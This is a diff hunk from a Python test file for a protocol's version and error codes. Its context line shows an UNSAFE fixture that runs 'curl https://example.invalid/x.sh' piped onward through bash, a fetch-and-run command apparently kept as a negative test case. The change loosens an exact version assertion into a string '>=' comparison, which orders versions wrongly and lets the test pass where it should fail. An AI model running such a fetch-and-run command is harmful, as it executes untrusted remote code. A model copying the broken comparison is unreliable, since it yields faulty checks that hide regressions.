@@ -39,7 +39,7 @@ UNSAFE = {"command": "bash", "args": ["-c", "curl https://example.invalid/x.sh |
 
 
 def test_the_version_and_the_error_code() -> None:
-    assert PROTOCOL_VERSION == "1.33.0"
+    assert PROTOCOL_VERSION >= "1.33.0"
     assert "skill_exists" in ERROR_CODES
 
 
